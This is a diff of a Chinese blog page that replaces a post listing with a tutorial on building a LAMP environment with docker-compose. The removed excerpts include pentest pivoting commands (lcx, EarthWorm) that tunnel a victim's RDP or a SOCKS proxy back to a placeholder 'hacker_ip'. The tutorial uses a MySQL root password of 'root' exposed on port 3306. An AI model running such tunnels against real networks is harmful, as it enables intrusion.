@@ -3,9 +3,9 @@
 <head>
     <meta http-equiv="content-type" content="text/html; charset=utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>端口转发 - Reber's Blog</title>
+    <title>使用docker-compose构造LAMP环境 - Reber's Blog</title>
     <meta name="keywords" content="渗透测试,web安全,漏洞,python,php,linux">
-    <meta name="description" content="我的个人博客，主要用于记录自己的一些学习笔记之类的东西，其中有渗透测试、python、php等。">
+    <meta name="description" content="使用docker-compose构造LAMP环境，其中日志、mysql数据、mysql配置文件、网站文件均为持久化存储。">
     <meta name="author" content="reber">
 
     
@@ -74,123 +74,212 @@
     </ul>
 </div>
 
-    
+
     <div class="main">
         <div class="left">
-            
+            <div>
+                <h2>使用docker-compose构造LAMP环境</h2>
+                
+                <div class="post-meta">
+                    <div style="padding:5px 5px 2px 5px;">
+                        <i class="fa fa-calendar fa-fw"></i>
+                        <time>2018-12-15</time>
+                        &nbsp;&nbsp;&nbsp;&nbsp;
+                    
+
+                    
+
+                    
+                        
+                        
+                        
+                            <i class="fa fa-folder fa-fw"></i>
+                            
+                                <a class="post-taxonomy-topic" href="http://wyb0.com/topics/linux">Linux</a>
+                            
+                        
+                        
+                        &nbsp;&nbsp;&nbsp;&nbsp;
+                        
+                        
+                        
+                            <i class="fa fa-tags fa-fw"></i>
+                            
+                                <a class="post-taxonomy-tag" href="http://wyb0.com/tags/docker">docker</a>
+                            
+                        
+                        
+                    </div>
+                </div>
+                
+            </div>
             <div class="content">
                 
-                    
-<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
-<article>
-    <header>
-        <h2><a href="http://wyb0.com/posts/linux-ssh-connect/">SSH免密登录及SSH隧道</a></h2>
+                
 
+<h3 id="0x00-实现功能">0x00 实现功能</h3>
+
+<p>使用docker-compose构造LAMP环境，其中日志、mysql数据库、mysql配置文件、网站文件均持久化存储到本机。</p>
+
+<p>apache、php通过Dockerfile构造，Dockerfile拉取ubuntu镜像，然后安装apache2和php。</p>
+
+<p>mysql的话通过docker的links连接mysql:5.5这个镜像当作数据库。</p>
+
+<h3 id="0x01-文件构造">0x01 文件构造</h3>
+
+<pre><code>➜  tree apache
+apache
+├── Dockerfile
+├── conf
+│   └── my.cnf
+├── docker-compose.yml
+├── log
+│   ├── apache
+│   └── mysql
+├── mysql
+├── src
+│   ├── init.sh
+│   └── sources.list
+└── www
+    └── index.php
+
+7 directories, 6 files
+</code></pre>
+
+<h3 id="0x02-docker-compose-yml">0x02 docker-compose.yml</h3>
+
+<pre><code>version: '3'
+services:
+  apache:
+    image: ubuntu:apache #镜像名为ubuntu，tag为apache
+    container_name: apache #运行后生成的容器名字为apache
+    build: . #使用当前路径下的Dockerfile构造镜像
+    ports:
+      - &quot;80:80&quot;
+    volumes:
+      - ./www:/var/www/html
+      - ./log/apache:/var/log/apache2
+    links:
+      - mysql
+    mem_limit: 1024m #最大内存使用不超过1024m
+    restart: always #容器重启策略：当容器终止退出后，总是重启容器，默认策略。
+  mymysql:
+    image: mysql:5.5 #拉取mysql:5.5
+    container_name: mysql
+    ports:
+      - &quot;3306:3306&quot;
+    volumes:
+      - ./conf/my.cnf:/etc/my.cnf
+      - ./mysql:/var/lib/mysql
+      - ./log/mysql:/var/log/mysql
+    environment: #设置环境变量
+      - MYSQL_ROOT_PASSWORD=root #mysql密码为root
+    mem_limit: 1024m #最大内存使用不超过1024m
+</code></pre>
+
+<h3 id="0x02-dockerfile">0x02 Dockerfile</h3>
+
+<pre><code>FROM ubuntu:14.04.4
+MAINTAINER reber &lt;1070018473@qq.com&gt;
+
+#定义会被容器自动执行的目录
+ENV AUTO_RUN_DIR /apache_init.d
+#定义shell文件名
+ENV INIT_SHELL init.sh
+
+COPY ./src /data
+WORKDIR /data
+RUN chmod +x init.sh
+RUN cp sources.list /etc/apt/sources.list &amp;&amp; apt-get update
+RUN apt-get install -y apache2
+RUN apt-get install -y php5 php5-gd php5-mysql libapache2-mod-php5 libapache2-mod-auth-mysql
+
+WORKDIR /var/www/html
+
+CMD [&quot;/data/init.sh&quot;]
+#ENTRYPOINT [&quot;tail&quot;,&quot;-f&quot;,&quot;/dev/null&quot;]
+</code></pre>
+
+<h3 id="0x03-conf-my-cnf">0x03 conf/my.cnf</h3>
+
+<pre><code>[mysqld]
+user=mysql
+default-storage-engine=INNODB
+character-set-server=utf8
+init_connect='SET NAMES utf8'
+
+[client]
+default-character-set=utf8
+
+[mysql]
+default-character-set=utf8
+</code></pre>
+
+<h3 id="0x04-src-sources-list">0x04 src/sources.list</h3>
+
+<pre><code>deb http://debian.ustc.edu.cn/ubuntu/ trusty main restricted universe multiverse
+deb http://debian.ustc.edu.cn/ubuntu/ trusty-security main restricted universe multiverse
+deb http://debian.ustc.edu.cn/ubuntu/ trusty-updates main restricted universe multiverse
+deb http://debian.ustc.edu.cn/ubuntu/ trusty-proposed main restricted universe multiverse
+deb http://debian.ustc.edu.cn/ubuntu/ trusty-backports main restricted universe multiverse
+deb-src http://debian.ustc.edu.cn/ubuntu/ trusty main restricted universe multiverse
+deb-src http://debian.ustc.edu.cn/ubuntu/ trusty-security main restricted universe multiverse
+deb-src http://debian.ustc.edu.cn/ubuntu/ trusty-updates main restricted universe multiverse
+deb-src http://debian.ustc.edu.cn/ubuntu/ trusty-proposed main restricted universe multiverse
+deb-src http://debian.ustc.edu.cn/ubuntu/ trusty-backports main restricted universe multiverse
+</code></pre>
+
+<h3 id="0x05-src-init-sh">0x05 src/init.sh</h3>
+
+<pre><code>#!/bin/bash
+
+service apache2 restart
+tail -f /dev/null
+</code></pre>
+
+<h3 id="0x05-www-index-php">0x05 www/index.php</h3>
+
+<pre><code>&lt;?php
+    //因为使用了links，所以在apache这个容器中可以直接用&quot;mymysql&quot;字符连接数据库，
+    //使用links后其实就是在apache这个容器的hosts文件中添加了&quot;mymysql&quot;字符到mysql容器的ip的映射
+    $link = mysql_connect(&quot;mymysql&quot;, &quot;root&quot;, &quot;root&quot;);
+    if(!$link)
+        die('Could not connect: ' . mysql_error());
+    else
+        echo &quot;Successfully connect to the mysql.&quot;;
+    mysql_close($link);
+?&gt;
+</code></pre>
+
+<h3 id="0x06-启动后访问">0x06 启动后访问</h3>
+
+<p><img src="/img/post/20181215-231620.png" alt="80" /></p>
+
+                
+                <div style="padding:10px 1px;">
+                    <font color="FF0000">若未作声明则文章版权归本人所有，转载请注明原文链接：</font>
+                    <script>
+                        var link = decodeURI(window.location.href);
+                        var url = '<a href="' + link + '">'+link+'</a>';
+                        document.write(url);
+                    </script>
+                </div>
+
+                
+<div class="prev-next-post pure-g">
+    <div class="pure-u-12-24" style="text-align: left;">
         
-        <div class="post-meta">
-            <div style="padding:5px 5px 2px 5px;">
-                <i class="fa fa-calendar fa-fw"></i>
-                <time>2016-08-10</time>
-                &nbsp;&nbsp;&nbsp;&nbsp;
-            
-
-                
-
-            
-                
-                
-                
-                    <i class="fa fa-folder fa-fw"></i>
-                    
-                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/linux">Linux</a>
-                    
-                
-                
-                &nbsp;&nbsp;&nbsp;&nbsp;
-                
-                
-                
-                    <i class="fa fa-tags fa-fw"></i>
-                    
-                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/ssh%E9%9A%A7%E9%81%93">SSH隧道</a>&nbsp;&#47;
-                    
-                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91">端口转发</a>
-                    
-                
-                
-            </div>
-        </div>
-    </header>
-
-    
-    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-        0x00 SSH相关选项  -V 显示版本 -f 输入密码后进入后台模式 -N 不执行远程命令，一般与-f连用，用于端口转发 -C 压缩传输的数据，网速快时会影响速度  
- -L l_port:r_host:r_port(将本地机的某个端口转发到远端指定机器的指定端口) -R l_port:r_host:r_port(将远程主机的某个端口转发到本地端指定机器的指定端口) -D l_port (指定一个本地机器 &ldquo;动态的&rdquo; 应用程序端口转发，目前支持SOCKS4和SOCKS5协议)  0x01 环境 A主机: 外网IP 222.222.222.222，内网IP 无 B主机: 外网IP 123.123.123.123，内网IP 192.168.1.10 C主机: 外网IP 无， 内网IP 192.168.1.11  0x02 SSH 免密登陆 A主机免密码登陆B主机：
-#A主机执行ssh-keygen -t rsa生成两个文件~/.ssh/id_rsa和~/.ssh/id_rsa.pub reber@ubuntu-linux:~$ ssh-keygen -t rsa #然后将id_rsa.pub中的内容复制到B主机的~/.ssh/authorized_keys中即可 #ssh-copy-id的功能就是将本机的公钥写入远端主机，也可以登录远端主机手工写入 reber@ubuntu-linux:~$ ssh-copy-id root@123.123.123.123 The authenticity of host '123.123.123.123 (123.123.123.123)' can't be established. RSA key fingerprint is a7:46:e4:9a:18:65:4e:8e:0b:8a:22:15:7d:91:a7:7f.
-    </p>
-
-    
-    <footer>
-        <a href="/posts/linux-ssh-connect/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
-    </footer>
-    
-</article>
-
-
-                
-                    
-<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
-<article>
-    <header>
-        <h2><a href="http://wyb0.com/posts/port-forwarding/">端口转发</a></h2>
-
+        <nav class="prev">
+            <a href="http://wyb0.com/posts/docker-compose/">
+                <i class="fa fa-chevron-left"></i>&nbsp;&nbsp;&nbsp;Docker之Docker Compose
+            </a>
+        </nav>
         
-        <div class="post-meta">
-            <div style="padding:5px 5px 2px 5px;">
-                <i class="fa fa-calendar fa-fw"></i>
-                <time>2016-08-08</time>
-                &nbsp;&nbsp;&nbsp;&nbsp;
-            
-
-                
-
-            
-                
-                
-                
-                    <i class="fa fa-folder fa-fw"></i>
-                    
-                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
-                    
-                
-                
-                &nbsp;&nbsp;&nbsp;&nbsp;
-                
-                
-                
-                    <i class="fa fa-tags fa-fw"></i>
-                    
-                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91">端口转发</a>
-                    
-                
-                
-            </div>
-        </div>
-    </header>
-
-    
-    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-         0x00 应用场景  内网IP的80端口通过端口映射到了外网IP的80端口上 内网的Web服务器通过外网IP反向代理(如Nginx) 也就是说Web服务器在内网中  0x01 判断Web是否为内网  向ping域名，查看IP是外网 用webshell查看ip却是内网IP  0x02 端口转发工具  lcx htran EarthWorm netsh reGeorg meterpreter porfwd  0x03 lcx端口转发  Hacker：lcx.exe -listen 500 8888 Victim：lcx.exe -slave hacker_ip 500 victim_ip 3389 Hacker：cmd mstsc hacker_ip:500  0x04 EarchWorm端口转发  Hacker：./ew -s rcsocks -l 1080 -e 8888 Victim：./ew -s rssocks -d hacker_ip -e 8888 1. 启动EarchWorm 2. hacker主机使用代理 3. hacker内网主机连接目标的内网主机   
-    </p>
-
-    
-</article>
-
-
-                
-
-                
-
+    </div>
+    <div class="pure-u-12-24" style="text-align: right;">
+        
+    </div>
+</div>
 
             </div>
         </div>
@@ -586,7 +675,7 @@
         </div>
     </div>
 
-    <br><br>
+    <br>
     
 <div class="foot">
     <div class="copyright">
@@ -617,3 +706,5 @@
 
 </body>
 </html>
+
+
